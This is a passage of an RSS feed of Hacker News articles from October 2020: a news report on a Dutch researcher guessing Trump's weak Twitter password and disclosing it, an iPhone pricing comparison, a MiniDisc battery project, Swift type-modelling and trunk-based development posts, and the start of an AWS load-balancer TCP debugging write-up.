seriously, as evidenced by correspondence seen by de Volkskrant. Meanwhile Trump’s account has been made more secure.</p><p data-element-id="cd30-cedb-07c2-93d7-a663-5828-30a5-5d9a">This is not the first time that Dutch hackers succeeded in taking over Donald Trump’s Twitter account. The first time was four years ago, just before the 2016 elections, when three hackers jointly managed to retrieve Trump’s password and access his account. That someone has now succeeded again, is remarkable. During the previous presidential elections Russian hackers attempted to influence the elections on a large scale. Subsequently, social media have taken various steps to prevent manipulation.</p><p data-element-id="cb67-ef02-5e43-1c58-e530-8e49-5d42-7cd2">Today as well, barely three weeks before the presidential elections, attempts are being made from Russia and Iran to digitally influence the elections. Obviously, the President’s Twitter account is a target too. Twitter declines to respond on the record, stating that they never comment on security measures for individual accounts. Ronald Prins, founder of security company Hunt &amp; Hackett and one of the best-known Dutch security experts, says: ‘I’ve known Victor Gevers for quite a few years. He has a reputation of devoting his life to finding vulnerabilities and always adopts a very ethical attitude in doing so. On the basis of what I know and have seen, his claim seems credible.’</p><h3 data-element-id="3cd7-0aef-c61e-659e-e0e2-9543-03a8-128f">2016 hack</h3><p data-element-id="720f-405b-63d6-f369-e9e8-6270-6c66-658a">Victor Gevers was also one of the three hackers who logged into Trump’s account in 2016. ‘That we would succeed in doing it again so soon, was not planned’, he says about the buildup to the action. The reason for making another attempt to hack Trump’s account was the reporting in the US about Hunter Biden. A hard disk owned by presidential candidate Joe Biden’s son was supposedly stolen or hacked – also because Hunter Biden used an easy to guess password (Hunter02). Gevers is familiar with leaked databases of old passwords and searched these for Hunter Biden’s data. After analysing these old databases, he felt that the information was incorrect. Hunter Biden used other passwords. Gevers: ‘I could tell that it wasn’t his password.’</p><p data-element-id="75db-2de2-faf8-fc31-16d0-d99f-b879-3ccd">It gives him the idea to check how good the security of verified Twitter accounts actually is. He looks at the account of Susan Rice, the former US national security adviser, and at that of Joe Biden. And also takes a look at Donald Trump, while he’s at it. ‘Doing spot checks, that’s my work: look for any leaks in security.’</p><p data-element-id="d4fd-0bc3-c406-a8b0-3268-6c9e-8769-2843">Earlier discoveries by Gevers include an enormous Chinese database with the location data of 2.7 million inhabitants of Xinjang – China’s largest province and home to the Uyghurs. The poorly secured database contained all kinds of personal data: people’s ID number, nationality, phone number, date of birth, photos, employer, but also GPS coordinates of the places these individuals had visited. The existence of this database made it even clearer how meticulously China is monitoring the Uyghur minority in the country.</p><p data-element-id="45f1-e3ef-2f67-eaca-666a-a367-2947-c3e4">On Friday morning, almost absentmindedly, Gevers tries a number of passwords and their variations. On the fifth attempt: bingo! He tries ‘maga2020!’ (short for make America great again) and suddenly finds himself in the Twitter account of the American President. He is flabbergasted. Gevers: ‘I expected to be blocked after four failed attempts. Or at least would be asked to provide additional information.’ None of that.</p><p data-element-id="0a49-c680-a98e-21e9-d291-70bc-18bf-975f">On that Friday morning, Gevers has access to what is perhaps the most important Twitter account in the world and is in a position to send a message to 87 million people, the attentive world press, and government leaders. Gevers: ‘I did think: “Here we go again”.’</p><h3 data-element-id="5342-211d-6946-9cf2-ebf8-89fd-fcd1-b8c2">Illegal</h3><p data-element-id="2da9-1ce3-bc38-1f09-e397-5636-d20b-c1a1">After all, hacking an account is illegal. If Gevers wants to make it clear that he is acting with good intentions, he will have to proceed responsibly and document his steps. He takes screenshots. Then he sends an email to Donald Trump – ‘I still had an old email account of his’ – and sends a copy to the American organisation for digital security. He kindly advises Trump to take extra security measures. And perhaps use a somewhat longer password. Gevers even suggests one: !IWillMakeAmericaGreatAgain2020!, and adds instructions for activating two-step verification. ‘But I didn’t get a reply.’</p><p data-element-id="f6ea-8910-66b0-bf9a-95b6-b615-5fea-8aaf">So, he tries to warn others. Trump’s campaign team, his family. He sends messages via Twitter asking if someone will call Trump’s attention to the fact that his Twitter account is not safe. He tags the CIA, the White House, the FBI, Twitter themselves. No response.</p><p data-element-id="aac2-5921-f32c-921b-6962-09da-fe3a-ed47">Gevers: ‘Then on Saturday, I suddenly saw that two-step verification for the account had been activated.’ Two days later, in the evening, he receives an email from the American Secret Service. ‘Friendly. They were interested in my information. I forwarded everything to them.’ On Tuesday they speak digitally. They thank Gevers, telling him that they were unaware of the security leak. This still leaves the security researcher with a number of questions: ‘Why is it possible for someone from a different time zone to log into such an important account? Why doesn’t Twitter demand better passwords? If I can access his account, then foreign nations can do so as well, right? Why aren’t the persons who are supposed to protect the President informed when someone reports that his account is unsafe?’</p><h3 data-element-id="6701-b1b1-7279-551d-015e-e20b-5efc-6540">Surprisingly easy</h3><p data-element-id="c0f4-6fcc-64af-62c3-2b8d-84c3-109f-6fac">Matthijs Koot, security researcher at Secura, is also astonished at how easy it was for Gevers to take over Trump’s account. ‘To put it harshly: people who in the year 2020 still ignore basic advice on online security are a potential danger to themselves and to those around them.’</p><p data-element-id="47c2-0c2c-b48f-fc57-7b10-7e05-6d7f-065f">According to Koot, these risks also affect others. ‘Today, we are increasingly interconnected, which means that a hack of one individual’s account or computer may also undermine the privacy and security of others. After all, via Trump’s account you can also see private messages sent to him or refer others to links containing malware or to a fake login page.’ This raises the question of how responsible Twitter is when it comes to additional security measures. Koot: ‘They should either compel people to use additional authentication or, if people really don’t want this, make them use a complex password. The days of logging in with just a weak password are over.’</p><p data-element-id="364a660b-32af-4ff8-b17b-8a49a27d61d8"><span>Twitter declines to respond to questions. The question remains why Trump was using such a weak and simple password. Gevers has a possible explanation: ‘Trump is over 70 – elderly people often switch off two-step verification because they find it too complicated. My own mother, for instance. For younger generations digital security is more self-evident.’</span></p></section></section></div>]]>
            </description>
            <link>https://www.volkskrant.nl/nieuws-achtergrond/dutch-ethical-hacker-logs-into-trump-s-twitter-account~badaa815/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24858219</guid>
            <pubDate>Thu, 22 Oct 2020 14:12:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[iPhone 12 Pro so costly in India, you can fly to Dubai to buy it and save money]]>
            </title>
            <description>
<![CDATA[
Score 230 | Comments 240 (<a href="https://news.ycombinator.com/item?id=24857646">thread link</a>) | @notRobot
<br/>
October 22, 2020 | https://www.indiatoday.in/technology/features/story/iphone-12-pro-so-expensive-in-india-that-you-can-fly-to-dubai-to-buy-it-come-back-and-still-save-money-1733722-2020-10-21 | <a href="https://web.archive.org/web/*/https://www.indiatoday.in/technology/features/story/iphone-12-pro-so-expensive-in-india-that-you-can-fly-to-dubai-to-buy-it-come-back-and-still-save-money-1733722-2020-10-21">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>Apple launched four new iPhones including the iPhone 12 Mini, iPhone 12, iPhone 12 Pro, and iPhone 12 Pro Max. Out of all the four new releases, only two will be available in India for now- the iPhone 12 and iPhone 12 Pro. Soon after the new iPhones were announced, Apple discontinued the iPhone 11 Pro and iPhone Pro Max. The company also reduced the prices of its existing iPhones including the iPhone 11, iPhone XR, and iPhone SE.</p><p>The Apple iPhone 12 is priced starts at Rs 69,900 for the base variant whereas the iPhone 12 Pro costs Rs 1,19,900 for the base variant. Well, that is not something unexpected. Considering the previous trends, the iPhone Pro models are released with an exorbitant price tag. Now to add to the woes of people looking to buy the iPhone 12 Pro, they should know that the Apple iPhone 12 Pro is more expensive in India than in any other country. Dubai for instance sells the iPhone 12 Pro for Rs 84,000.</p><p>Now this rings a bell. The iPhone 12 Pro is comparatively cheaper in Dubai. So cheap that you can actually go to Dubai, buy the phone and come back. Let us explain the math to you for a better understanding.</p><p><strong>iPhone 12 Pro Price in India for 128 GB:</strong> Rs 1,19,000</p><p><strong>iPhone 12 Pro Price in Dubai for 128GB: </strong>Rs 84,000. It costs Dh 4,199 in Dubai and if you convert the currency to INR, the price comes down to almost Rs 84,000.</p><p>So, should this mean that you can go to Dubai, buy the phone and then come back? Well, if you ask me. It is not that bad an idea. The 12 Pro will go on sale from November 6. So you book a flight for Dubai from Delhi or Kolkata for November 6 or later than that, you can get the return ticket for a little over Rs 18,000.</p><p>Below is the exact amount, you would be spending on your flight tickets to Dubai from New Delhi. However, the amount might change depending on the availability but this is what we found when tried booking a ticket to Dubai.</p><p><em>Flight ticket: Indigo Rs 17929 approx<br>iPhone 12 Pro 128GB: 84,000<br>Some other expenses: Around Rs 10,000<br>Total: Around Rs 1,11,929<br>Money saved: Around Rs 8000</em></p><div> <p><img data-src="https://akm-img-a-in.tosshub.com/indiatoday/images/bodyeditor/202010/Screenshot_2020-10-21_at_12.19-1200x742.png?EZDB1F4V_MBUFqe1VNjueddsHKGJgQ7S" src="https://akm-img-a-in.tosshub.com/indiatoday/images/bodyeditor/202010/Screenshot_2020-10-21_at_12.19-1200x742.png?EZDB1F4V_MBUFqe1VNjueddsHKGJgQ7S" alt=""></p></div><p>Now, considering that the world is battling coronavirus pandemic and the virus is in no mood to slow down, we do not encourage anyone to travel. The whole idea was to not send you to Dubai but to draw your attention towards Apple’s exorbitant pricing in India. It is no secret that the taxes and duties that are applied to imported phones are highest in India. The taxes are so high that for an important iPhone that you will end up paying an average tax of Rs 24,000 for something like an iPhone 12 or iPhone 12 Mini.</p><p>However, despite the sky-rocketing prices, iPhone still sells best in India and the buyers give whatever price Apple asks them to pay. So for a business, that is not a bad deal at all.</p><p><span>ALSO READ | </span><a href="https://www.indiatoday.in/technology/features/story/apple-iphone-12-pro-12-pro-max-launched-price-specifications-and-features-1731303-2020-10-13">Apple iPhone 12 Pro, 12 Pro Max launched: Price, specifications, and features</a></p><p><iframe allowfullscreen="" frameborder="0" height="360" src="//www.youtube.com/embed/-6m1wJTd6hs" width="640"></iframe></p></div></div>]]>
            </description>
            <link>https://www.indiatoday.in/technology/features/story/iphone-12-pro-so-expensive-in-india-that-you-can-fly-to-dubai-to-buy-it-come-back-and-still-save-money-1733722-2020-10-21</link>
            <guid isPermaLink="false">hacker-news-small-sites-24857646</guid>
            <pubDate>Thu, 22 Oct 2020 13:15:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building replacement proprietary battery packs]]>
            </title>
            <description>
<![CDATA[
Score 221 | Comments 118 (<a href="https://news.ycombinator.com/item?id=24857527">thread link</a>) | @todsacerdoti
<br/>
October 22, 2020 | https://www.hallaminventions.com/projects/minidisc-obsession | <a href="https://web.archive.org/web/*/https://www.hallaminventions.com/projects/minidisc-obsession">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-block-type="2" id="block-63a2566fbe2b2e25ec30"><div><p>Sony’s MiniDisc format has been a love affair since it first came out in the 90s. I purchased one as soon as I could afford it at a shop called Dixons close to where I lived in rural England. Since that first enthusiastic purchase, I’ve collected a few other player/recorders over the years and a healthy collection of discs.</p><p>Back in the day, using Sony’s SonicStage software to manage my collection was a pain. It was slow at the get go, and became increasingly choppy as tracks grew into the thousands. Rights management restrictions, imposed to stop folks from pirating perfect digital copies, were a nuisance. Yet, I loved that first MiniDisc player and the amazing little discs that slotted into it.</p><p>Two and a half decades later, I’ve added a few more MiniDisc devices and a lot more discs in my collection. My favorite is the Sony MZ-RH1, the last MiniDisc player/recorder Sony ever produced. It is sleek and sexy, sounds amazing, can record 34 hours of music onto a single disc, and is as much a work of art as a piece of electromechanical and electro-optical engineering can achieve. </p><p>Unfortunately, Sony doesn’t make the lithium ion batteries for this masterpiece anymore, and the one I have, which arrived with it packed in the box, no longer accepts a charge. A quick search on eBay brings up a few new “old stock” batteries to buy, but folks want $150+. </p><p>I needed a solution that didn’t induce sticker-shock…</p></div></div></div></div>]]>
            </description>
            <link>https://www.hallaminventions.com/projects/minidisc-obsession</link>
            <guid isPermaLink="false">hacker-news-small-sites-24857527</guid>
            <pubDate>Thu, 22 Oct 2020 13:02:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What can a pipe wrench teach us about software engineering?]]>
            </title>
            <description>
<![CDATA[
Score 74 | Comments 36 (<a href="https://news.ycombinator.com/item?id=24857224">thread link</a>) | @ingve
<br/>
October 22, 2020 | https://mokacoding.com/blog/pipe-wrench/ | <a href="https://web.archive.org/web/*/https://mokacoding.com/blog/pipe-wrench/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>What can a pipe wrench teach us about software engineering?
A lot, according to <a href="https://en.wikipedia.org/wiki/Vannevar_Bush">Vannevar Bush</a>.</p>
<p>An electrical engineer and professor at MIT, Bush was "one of the most politically powerful inventors in America since Benjamin Franklin," as his biographer <a href="https://geni.us/liVH8">G. Pascal Zachary puts it</a>.
During WWII, he personified the United State's military research, organized the Manhattan Project, and played a crucial role in the Allied victory.
He was also a mentor to <a href="https://en.wikipedia.org/wiki/Claude_Shannon">Claude Shannon</a>, the father of the information age.</p>
<p>One anecdote of Bush's career as an instructor at MIT particularly inspired me: his pipe wrench lecture.</p>
<p>Bush would greet an auditorium filled with aspiring engineers, hold up a pipe wrench, and challenge them: "Describe this".</p>
<p><img src="https://mokacoding.s3.amazonaws.com/2020-10-21-pipe-wrench.jpg" width="70%" alt="image of a pipe wrench"></p>
<p><i>Not the actual pipe wrench showed by Bush, I found this one on Amazon.</i></p>

<p>One by one, they would try, and each time Bush would dissect the description, pointing out where it was vague.</p>
<p>Finally, he would write in precise English a patent application for the wrench:</p>
<blockquote>
<p>By turning the nut to the right or left the movable jaw may be moved either toward or away from the fixed jaw, as may be desirable.
The inner face of the movable jaw is formed at a right angle to its shank, and is also provided with a series of teeth, which pitch or rake on its fellow jaw...</p>
</blockquote>
<p>With this exercise, Bush drilled into the class the value of precision.</p>
<h2 id="precision">Precision</h2>
<p>"Given the pipe wrench, produce the words for that wrench and no other; given the words, produce the wrench.
That, Bush taught his students, was the beginning of engineering", write Soni and Goodman in <a href="https://geni.us/FqRN7P"><em>A Mind at Play</em></a>.</p>
<p>Bush MIT students were electrical engineers, but precision is something software engineers should learn, too.</p>
<p>Precision is fundamental when representing building a model for the domain of the software in code.</p>
<p>One way in which a domain representation can be vague is when it allows inconsistent state to occur.
If you work in a language with a strong type system, like Swift, you can use precise types to make your domain modeling clearer and make undesirable state unrepresentable.</p>
<p>For example, when modeling an operation that can either succeed with some data or fail with an error, you could use a type like this:</p>
<pre><code><span><span>struct</span> <span>Operation</span> </span>{
  <span>let</span> success: <span>Bool</span>
  <span>let</span> data: <span>Data?</span>
  <span>let</span> error: <span>Error?</span>
}
</code></pre>
<p>This type does the job but leaves room for errors: nothing stops you from creating an instance with <code>success</code> true but <code>data</code> nil or one with values in both <code>data</code> and <code>error</code>.</p>
<pre><code><span>let</span> inconsistentOperation = <span>Operation</span>(success: <span>false</span>, data: someData, error: .<span>none</span>)
</code></pre>
<p>Using the <a href="https://developer.apple.com/documentation/swift/result"><code>Result</code> <code>enum</code></a>, you can remove this ambiguity <em>at compile time</em>, making it impossible for both data and error to be set simultaneously.</p>
<pre><code><span><span>struct</span> <span>Operation</span> </span>{
  <span>let</span> result: <span>Result</span>&lt;<span>Data</span>, <span>Error</span>&gt;
}
</code></pre>
<p>Another useful <code>enum</code>, borrowed from the <a href="https://elm-lang.org/">Elm programming language</a>, is <a href="https://github.com/mokagio/RemoteData"><code>RemoteData</code></a>: a way to encapsulate the state of a network operation.</p>
<pre><code><span><span>enum</span> <span>RemoteData</span>&lt;<span>T</span>&gt; </span>{
  <span>case</span> notAsked
  <span>case</span> loading
  <span>case</span> loaded(<span>T</span>)
  <span>case</span> failed(<span>Error</span>)
}
</code></pre>
<p><code>enum</code>s are not the only way tool to make your domain modeling more precise.
<a href="https://github.com/pointfreeco/swift-nonempty"><code>NonEmpty</code></a> uses <a href="https://docs.swift.org/swift-book/LanguageGuide/Generics.html#ID186">type constrained generics</a> to represent <code>Collection</code>s that are not empty.</p>
<pre><code>
<span>let</span> xs = <span>NonEmpty</span>&lt;[<span>Int</span>]&gt;(<span>1</span>, <span>2</span>, <span>3</span>, <span>4</span>)
xs.first + <span>1</span> 
</code></pre>
<p>Using <code>NonEmpty</code> adds clarity to the values you define, possibly avoiding runtime crashes by making it impossible to access via subscript an empty array.</p>
<p>If you had to represent "a collection of unique positive integers where order matters and with at least one element," you could use <code>[Int]</code>, or you could combine <code>NonEmpty</code>, <a href="https://github.com/Weebly/OrderedSet"><code>OrderedSet</code></a>, and <a href="https://developer.apple.com/documentation/swift/uint"><code>UInt</code></a> in <code>NonEmpty&lt;OrderedSet&lt;UInt&gt;&gt;</code>.</p>
<p>Using <code>[Int]</code> might be simpler but leaves the door open for all sorts of inconsistent instances, like an empty array, an array with negative values, or one with more than one occurrences of the same value.
<code>NonEmpty&lt;OrderedSet&lt;UInt&gt;&gt;</code> requires more work but using it will make the compiler help you avoid inconsistent state.</p>
<hr>
<p>We like to call ourselves software <em>engineers</em>, but sometimes forget that engineering is an applied science.
It is rigorous and methodical.
When building a bridge, an integrated circuit, or a motor, precision matters.
If the parts don't fit, if the power supply is not adequate, if there isn't enough material, things won't work.</p>
<p>With software, we're blessed with having a more malleable medium than our colleagues working in the physical realm.
That shouldn't be an excuse to forget the value of precision.</p>
<p>What are your favorite ways to use the type-system to implement a precise domain model?</p>
<p>Leave a comment below or get in touch on Twitter at <a href="https://twitter.com/mokagio">@mokagio</a>.</p>
</div></div>]]>
            </description>
            <link>https://mokacoding.com/blog/pipe-wrench/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24857224</guid>
            <pubDate>Thu, 22 Oct 2020 12:23:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Step-by-Step: Programming Incrementally]]>
            </title>
            <description>
<![CDATA[
Score 73 | Comments 11 (<a href="https://news.ycombinator.com/item?id=24857049">thread link</a>) | @pmarin
<br/>
October 22, 2020 | https://ourmachinery.com/post/step-by-step-programming-incrementally/ | <a href="https://web.archive.org/web/*/https://ourmachinery.com/post/step-by-step-programming-incrementally/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      <p>One thing that has really benefited my productivity (and also my general sanity), has been learning
how to take a big task and break it down into smaller, more manageable steps. Big tasks can be
frightening and overwhelming, but if I just keep working on the list of smaller tasks, then somehow,
as if by magic, the big task gets completed.</p>



<h2 id="adding-value">Adding value</h2>

<p>When programming, I take a very specific approach to this breakdown. I make sure that each step is
something that <em>compiles, runs, passes</em> all the tests<em>,</em> and <em>adds value</em> to the codebase<em>.</em> Exactly
what “adds value” means is purposefully left vague, but it can be things like adding a small
feature, fixing a bug, or taking a step towards refactoring the code into better shape (i.e.,
reducing <a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwikqYmb_6DsAhXSpZ4KHYm9BhgQFjAHegQIBxAC&amp;url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FTechnical_debt&amp;usg=AOvVaw1ZJ1dsWoB5Jn1hXvtLGuSZ">technical
debt</a>).</p>

<p>An example of <em>not</em> adding value is adding a new feature, but also introducing ten new bugs. It’s
not clear that the value of the feature outweighs the cost of the bugs, so it might be a net loss.</p>

<p>Another example of not adding value is making the UI prettier, but also make the app run ten times
slower. Again, it’s not clear that the prettier look is worth the performance hit, so it might be a
net loss.</p>

<p>Of course, I can’t always be sure that I’m not introducing bugs, and “value” is inherently
subjective (how much performance is a new feature worth). The important part is the <em>intention</em>. My
<em>intention</em> is to always add value with every single commit.</p>

<p>Basically, what I want to avoid is the “It has to get worse before it gets better”-attitude. Also
known as: “The new system is the modern way to do it. Sure, it has some bugs and runs kind of slow
right now, but once we’ve fixed that, it’s going to be way better than what we had before.” I’ve
seen too many cases where these supposed fixes never happen and the new system, which was supposed
to be better, just made things worse.</p>

<p>Plus, you know, it feels good to add value. If every day I can make a commit and that commit makes
the engine better in some way, that makes me happy.</p>

<h2 id="pushing-to-master">Pushing to master</h2>

<p>In addition to implementing changes through a series of small commits, I also <em>push every one of
those small commits back to the master branch.</em></p>

<p>Note that this is the exact opposite of a <a href="https://guides.github.com/introduction/flow/">feature
branch</a> workflow, instead, it is a form of
<a href="https://cloud.google.com/solutions/devops/devops-tech-trunk-based-development">trunk-based</a>
development:</p>

<ul>
<li><p>In a feature branch workflow developers work on new features in isolated, separate branches of the
code and don’t merge them back to master until they’re “complete”: fully working, debugged,
documented, code reviewed, etc.</p></li>

<li><p>In the trunk-based approach, features are implemented as a series of small individual commits to
the master branch itself. Care must be taken so that everything works even when the features are
only “partially implemented”:</p></li>
</ul>


<figure>
    
        <img src="https://ourmachinery.com/images/step__trunk-based-development.png">
    
    
    <figcaption>
        <h4>Trunk-based vs feature branch development.</h4>
        
    </figcaption>
    
</figure>


<p>Proponents of the feature branch approach claim that it is a safer way to work since changes to the
feature branch don’t disrupt the master and cause bugs. Personally, I think this safety is illusory.
Bugs in the feature branch just get hidden until it’s merged back to master when we suddenly get
<em>all</em> the bugs.</p>

<p>Feature branches also go against my philosophy that every commit should add value. The whole idea
behind a feature branch is: “we’re going to break a bunch of shit over here, but don’t worry, we’ll
fix it before we merge back to master”. Better not to break stuff in the first place.</p>

<p>Here are some other advantages I see with the trunk-based approach:</p>

<ul>
<li><p><strong>Fewer merge conflicts.</strong> With long-running feature branches, the code in the branch drifts
further and further away from the code in master, causing more and more merge conflicts. Dealing
with these is a lot of busy work for programmers and it also risks introducing bugs. Some of these
bugs won’t be seen until the branch is merged.</p></li>

<li><p><strong>Less release-day chaos.</strong> Typically, all features scheduled for a certain release have the same
deadline. This leads to all feature branches being merged just before the deadline. This means
that we get all the merge and integration bugs at the same time, just before the release date.
Getting a lot of bugs at the same time is a lot worse than having them spread out evenly. And
getting them just before a release is due is the absolute worst time to get them.</p></li>

<li><p><strong>No worry about the right time to merge.</strong> Since everybody knows that merging a feature branch
tends to cause instability, this leads to worry about the “right time” to merge. You want to avoid
merging right before a release (unless the feature is required for the release) to avoid
introducing bugs in the release. So maybe just after the release has been made? But what if we
need a hotfix for the release? While the merge is being held, valuable programmer time is being
wasted.</p></li>

<li><p><strong>No rush to merge.</strong> When working with feature branches, I often felt a hurriedness about getting
the branches merged. Sometimes because a branch was needed for a specific release. But also often
because the developer was tired of dealing with merge conflicts, wanted to get it over with, and
move on to the next thing. Thus, the goal of only merging feature branches when they are
“complete” was often compromised. (And of course, nothing is ever really “complete”.)</p></li>

<li><p><strong>Easier to revert.</strong> If major issues are discovered after the merge of a feature branch (which
often happens), there is often a lot of reluctance to revert the merge. Another big feature branch
might already have been merged on top of it (since lots of feature branches often get merged at
the same time, just before a release), and reverting it would cause total merge chaos. So instead
of doing a calm, sensible rollback, the team has to scramble desperately to fix the issues before
the release. With trunk-based development, any major issues would most likely have already been
discovered. The final commit that makes the new feature “go live” is typically a simple one-line
change that is painless to revert.</p></li>

<li><p><strong>Partial work is shared.</strong> In trunk-based development, the partial work done on a feature is seen
by all developers (in the master branch). Thus, everybody has a good idea of where the engine is
going. Bugs, design flaws, and other issues can be discovered early. And it is easier for others
to adapt their code to work with the new feature. It’s also easier to get an estimate of how much
work is needed to complete a feature when everybody can see how far it has progressed.</p></li>

<li><p><strong>Easier to pause and pick up later.</strong> Sometimes, work on a feature might have to be paused for a
variety of reasons. There might be more critical issues that need to be addressed. Or the main
developer of the feature might get sick, or have vacation coming up. This is a problem for feature
branches because they tend to “rot” over time, as the code base drifts further and further away,
causing more and more merge conflicts with the branch. Code that is checked into master does not
“rot” in the same way.</p></li>

<li><p><strong>Easier to address other bugs/refactors at the same time.</strong> When working on a feature or a
problem, it is pretty common to find other, related problems, exposed by the work you are doing.
In the trunk-based approach, this is not an issue. You would just make one or more separate
commits to the trunk to fix those issues. With the feature branch approach, it is more tricky. I
guess the <em>right</em> thing to do would be to branch off a new separate bug fix branch from master,
fix the issue in that branch, merge <em>that</em> branch into the branch you are currently working on,
and (once it passes code review) into master (so that other people get the bug fix before your
feature branch is merged, because who knows when that will happen). But who has time for all that
shit? So instead, people just fix the problem in their feature branch, and maybe cherry-pick it
into master if they’re having a good day. So now, instead of being about a single isolated
feature, the feature branch becomes a tangled mix of different features, bug fixes, and refactors.</p></li>
</ul>

<p>The main challenge of the trunk-based approach is how to break a big task down into individual
pieces. Especially, with the requirement that each piece should compile, run, add value, and be
ready to be pushed into master. How can we push partial work without exposing users to half-baked,
not yet fully working features?</p>

<p>Let’s look at some problems and how to solve them.</p>

<h2 id="problem-1-new-features">Problem #1: New features</h2>

<p>An approach that works well for new features is to use a flag to control whether a feature is
visible to end-users or not.</p>

<p>Let’s look at an example. A feature that I recently added to the engine was a <em>Download</em> tab that
lets the users download new engine versions and sample projects from within the engine itself:</p>


<figure>
    
        <img src="https://ourmachinery.com/images/step__download-tab.png">
    
    
    <figcaption>
        <h4>Download tab.</h4>
        
    </figcaption>
    
</figure>


<p>There are lots of different ways this could be broken down into smaller steps. Here’s an example:</p>

<ul>
<li>Add the <em>Download</em> tab to the menus and show a new blank tab when it’s opened.</li>
<li>Show a (hard-coded) list of things to download (without working download buttons).</li>
<li>Download the list of files from a server instead of having it hard-coded.</li>
<li>Implement the <code>[Get]</code> button by synchronously downloading the file when it’s clicked.</li>
<li>Switch to asynchronous, background downloading.</li>
<li>Show a progress bar for the download.</li>
<li>…</li>
</ul>

<p>Normally, I don’t do a full breakdown like this upfront. Instead, I just kind of figure out the next
logical step as I go along. I only sit down and do a serious planning session if the task is
particularly tricky and incremental steps like this don’t come naturally.</p>

<p>To prevent end-users from seeing the tab before it’s actually working, I hide it behind a flag. This
can be as simple as:</p>

<pre><code>const bool download_tab_enabled = false;

// ...

if (download_tab_enabled) {
    add_menu_item(tabs, "Download", open_download_tab);
}
</code></pre>

<p>To get the menu option to show the <em>Download</em> tab, you have to change the <code>download_tab_enabled</code>
flag to <code>true</code> and recompile.</p>

<p>We call these flags <a href="https://en.wikipedia.org/wiki/Feature_toggle"><em>feature flags</em></a> since they
selectively enable or disable …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ourmachinery.com/post/step-by-step-programming-incrementally/">https://ourmachinery.com/post/step-by-step-programming-incrementally/</a></em></p>]]>
            </description>
            <link>https://ourmachinery.com/post/step-by-step-programming-incrementally/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24857049</guid>
            <pubDate>Thu, 22 Oct 2020 11:55:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AWS NLBs and the mixed up TCP connections]]>
            </title>
            <description>
<![CDATA[
Score 175 | Comments 64 (<a href="https://news.ycombinator.com/item?id=24856607">thread link</a>) | @nielsole
<br/>
October 22, 2020 | https://www.niels-ole.com/cloud/aws/linux/2020/10/18/nlb-resets.html | <a href="https://web.archive.org/web/*/https://www.niels-ole.com/cloud/aws/linux/2020/10/18/nlb-resets.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <div>

  

  <article>
    <p>One of my services was running into timeouts, because connections were being reset by clients. 
I had assumed that it couldn’t be the <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/network/introduction.html">Network Load Balancers (NLBs)</a> fault, a battle-tested piece in the cloud stack.
The following is about NLBs, cross-zone-loadbalancing and multiple NLBs pointing to the same set of EC2 instances and how that revealed unexpected behaviour in the NLB.</p>

<p><strong>TLDR</strong>: If you don’t want timeouts or connection resets, then:</p>
<ul>
  <li>don’t use cross-zone loadbalancing</li>
  <li>don’t have multiple NLBs pointing at the same targets</li>
  <li>don’t use a public IPv4 address and an NLB for the same target</li>
</ul>

<h2 id="the-symptom-timeouts">The symptom: Timeouts</h2>

<p>My system was doing lots of requests to two NLBs over the internet.
Unfortunately in quite some cases there were timeouts in the application code.
The timeouts were quite aggressive at 1 second. Since a normal packet loss during connecting usually takes 3 seconds before a retry on linux, 
I initially explained it away as naturally occurring packet loss. 
But the number of failures grew ever higher with the link not even close to being saturated and other calls to external targets being fine.</p>

<p>When I finally got myself to take tcpdumps of the traffic, something strange emerged: TCP RST packets.</p>

<h2 id="the-setup-simplified">The Setup (simplified)</h2>

<p>The configuration in which these issues actually surfaced had multiple machines behind a NAT, talking to multiple EC2 instances behind two NLBs with cross-zone-loadbalancing enabled.</p>

<p>But that’s the messy reality, let’s keep it simple for this article. In the following let’s have 1 client, 1 NLB and 1 EC2 instance, because the issue would still be the same.
The NLB has cross-zone loadbalancing enabled.
<img src="https://www.niels-ole.com/assets/2020/nlb-basic.png" alt="An example of IPs used in the requests to an NLB"></p>

<h2 id="background">Background</h2>
<p>In TCP, connections are identified by the quadruple of source ip, source port, target ip and target port.
When you create a new TCP connection, it is made sure that no other connection with the same quadruple is in use.</p>

<h2 id="the-problem">The problem</h2>

<p>(Fast forward a couple of days of staring at tcpdump and head-scratching) 
Here is an excerpt of tcpdump as the client sees it, with all the noise removed:</p>

<div><div><pre><code>Format clientip:clientport &lt;-&gt; targetip:targetport (so a bit different than it looks in wireshark) 
... This connection has been established for some time
90.63.58.20:36230 &lt;- 34.242.162.234:443 Seq=1234 Ack=5432   [ACK]
</code></pre></div></div>

<p>EC2 instance (private IP) says through the NLB (34.242.162.234) to the client (90.63.58.20): <em>Hey, I just received your data, all is good.
This connection is healthy and sending data. Everything as expected.</em> 
Now our client wants to make a new connection and sends a SYN packet.</p>

<div><div><pre><code>90.63.58.20:36230 -&gt; 18.203.64.15:443   Seq=6951            [SYN]
</code></pre></div></div>

<p>As you notice, the source ports are identical, but this is fine, as the target IPs are different.
Next in the 3-way handshake of TCP we would expect a <code>[SYN,ACK]</code> with <code>Ack=6952</code></p>

<div><div><pre><code>90.63.58.20:36230 &lt;- 18.203.64.15:443 Seq=1234  Ack=5432    [ACK], window reduced
</code></pre></div></div>

<p>This packet has the same quadruple, but it isn’t our <code>[SYN,ACK]</code>… wait a sec. Where is this coming from? Does this ack belong on the other connection that the client had with <code>34.242.162.234</code>!?
The Ack numbers match, but that can’t be, can it?</p>

